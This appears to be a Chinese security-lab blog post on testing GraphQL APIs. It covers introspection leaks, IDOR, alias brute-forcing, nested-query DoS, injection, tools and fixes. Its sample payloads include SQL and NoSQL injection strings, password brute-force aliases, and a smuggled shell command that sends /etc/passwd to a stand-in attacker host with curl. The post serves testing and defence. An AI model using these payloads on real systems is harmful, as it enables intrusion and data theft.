---
title: [前沿技术] GraphQL API 安全测试
url: https://mp.weixin.qq.com/s/37TChtjZDRdcMdn3C6AQWQ
source: Doonsec's feed
date: 2026-05-25
fetch_date: 2026-05-26T06:06:11.533161
---

# [前沿技术] GraphQL API 安全测试

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/BasqgWRklkSZqSvnlUGGJV9iaVibxLsALl5ZwTnY42LYlmcPqhgY2gmumxztsvaUT0BpvNKs0IJo0eBOOKwAlV3WN4D09J1T019BcAC6zFN34/0?wx_fmt=jpeg)

# [前沿技术] GraphQL API 安全测试

原创

Pik安全实验室
Pik安全实验室

Pik安全实验室

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

0x00 介绍

GraphQL 是 Facebook 开源的 API 查询语言，允许客户端精确指定所需数据，避免了 REST API 的过度获取和不足获取问题。GitHub、Shopify、Twitter 等大量平台已迁移到 GraphQL。但灵活性的另一面是更大的攻击面——内省泄露、字段级权限绕过、嵌套查询 DoS、注入攻击等，需要专门的安全测试方法。

0x01 GraphQL 基础

查询结构

GraphQL 核心三种操作类型：

# Query — 读取数据
query {
user(id: 1) {
    name
    email
    posts { title }
}
}

# Mutation — 修改数据
mutation {
createPost(title: "test", content: "hello") {
    id
}
}

# Subscription — 实时推送（WebSocket）
subscription {
postAdded { id title }
}

内省查询

GraphQL 内置的内省（Introspection）系统是攻击者的信息金矿。通过内省可以获取整个 Schema、所有类型、字段、参数。

# 获取所有类型
{ \_\_schema { types { name kind fields { name type { name kind } } } } }

# 获取所有 Query 入口
{ \_\_schema { queryType { fields { name args { name type { name kind } } } } } }

# 获取所有 Mutation
{ \_\_schema { mutationType { fields { name args { name type { name kind } } } } } }

0x02 常见漏洞

内省信息泄露

生产环境启用内省是最常见的配置错误。攻击者获取 Schema 后可绘制完整 API 地图，发现隐藏的管理接口和敏感字段。

# 探测内省是否开启
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ \_\_schema { types { name } } }"}'

# 利用 graphql Voyager 可视化
# 将内省结果导入 https://ivangoncharov.github.io/graphql-voyager/

字段级别权限绕过（IDOR）

GraphQL 解析器可能只在顶层做了权限校验，嵌套字段直接返回敏感数据。

# 正常查询自己的资料
query { me { name email } }

# 遍历所有用户（IDOR）
query { user(id: 1) { name email ssn } }
query { user(id: 2) { name email ssn } }

# 嵌套查询绕过权限
query {
publicPosts {
    author {           # 通过 post 反向查 user
      email            # 可能泄露邮箱
      privateMessages# 如果能查到私信
    }
}
}

批量查询与 DoS

GraphQL 支持别名，可在单次请求中批量发送查询。配合嵌套查询可造成深度递归攻击。

# 别名攻击（Batching Attack）— 暴力破解
query {
a: login(username:"admin", password:"123456") { token }
b: login(username:"admin", password:"password") { token }
c: login(username:"admin", password:"admin123") { token }
# ... 一次请求尝试 100 个密码
}

# 深度嵌套 DoS
query {
user {
    posts {
      comments {
        author {
          posts {
            comments {
              author {# 无限递归
                posts { title }
              }
            }
          }
        }
      }
    }
}
}

注入攻击

GraphQL 参数同样可能存在 SQL 注入、NoSQL 注入、命令注入等。

# SQL 注入
query {
search(keyword: "' OR 1=1; --") {
    results { title }
}
}

# NoSQL 注入
query {
user(email: "{\"$gt\":\"\"}") {# MongoDB $gt 绕过
    name password
}
}

# OS 命令注入
mutation {
exportReport(filename: "test; curl evil.com/$(cat /etc/passwd)") {
    url
}
}

订阅（Subscription）劫持

WebSocket 订阅可能未做认证，未授权用户可订阅实时数据流、窃听敏感事件。

# WebSocket 连接未验证
wss://target.com/graphql
→ {"type":"start","id":"1","payload":{
    "query":"subscription { newPrivateMessage { from content } }"
  }}

0x03 测试工具

graphql-cop

Python 编写的 GraphQL 安全审计工具，自动检测常见漏洞。

# 安装与使用
pip install graphql-cop
graphql-cop -t https://target.com/graphql

# 检测项
- 内省是否开启
- 字段建议（Field Suggestions）
- 深度查询限制
- 别名攻击
- 批量查询

InQL (Burp Suite)

Burp Suite 扩展，解析 GraphQL Schema 并生成测试请求。

Clairvoyance

即使内省被禁用，也能通过字段名猜解恢复部分 Schema。

# 使用 Clairvoyance 猜测 Schema
python3 clairvoyance.py -o schema.json https://target.com/graphql

# 配合常见字段字典
python3 clairvoyance.py -w wordlist.txt https://target.com/graphql

GraphQL Raider

Burp Suite 专业版的原生 GraphQL 测试模块，支持自动生成测试用例。

0x04 修复方案

1. 禁用生产环境内省

// Apollo Server
new ApolloServer({
  typeDefs, resolvers,
  introspection: process.env.NODE\_ENV !== 'production'
})

// GraphQL Yoga
createYoga({ schema, maskedErrors: false })
// 默认关闭内省

2. 查询深度限制

// graphql-depth-limit
import depthLimit from 'graphql-depth-limit'
const server = new ApolloServer({
  validationRules: [depthLimit(5)]  // 最多 5 层嵌套
})

// graphql-query-complexity
// 根据字段权重计算查询成本，超过限制拒绝

3. 速率限制 + 查询白名单

使用 Persisted Queries 限制客户端只能执行预注册的查询。配合速率限制防止暴力枚举。

4. 字段级权限控制

在 Resolver 层面实现细粒度授权，每个字段都检查当前用户的访问权限。

本文仅作安全研究与学习用途，用于非法行为后果自行承担。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/RBwZuZBV3fSt1n0yS8EEGgiaDF2WgPfMeiaGOMly1wWQQUlwiclwJDFJAZFGmeSroT0oLpGETAeKwiaPBeY1whYoOA/0?wx_fmt=png)

Pik安全实验室

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/RBwZuZBV3fSt1n0yS8EEGgiaDF2WgPfMeiaGOMly1wWQQUlwiclwJDFJAZFGmeSroT0oLpGETAeKwiaPBeY1whYoOA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过